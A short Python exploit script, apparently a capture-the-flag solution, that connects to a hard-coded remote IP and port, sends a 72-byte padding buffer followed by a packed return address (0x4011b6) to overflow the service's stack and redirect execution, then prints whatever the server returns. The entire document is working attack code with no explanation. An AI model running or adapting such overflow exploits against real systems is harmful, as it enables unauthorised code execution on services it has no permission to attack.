
import socket,struct,time
s=socket.create_connection(("72.61.231.171",9108))
s.settimeout(5)
print(s.recv(4096).decode(errors="replace"))
s.sendall(b"A"*72 + struct.pack("<Q",0x4011b6) + b"\n")
time.sleep(1)
while True:
    try:
        data=s.recv(4096)
        if not data: break
        print(data.decode(errors="replace"), end="")
    except socket.timeout:
        break
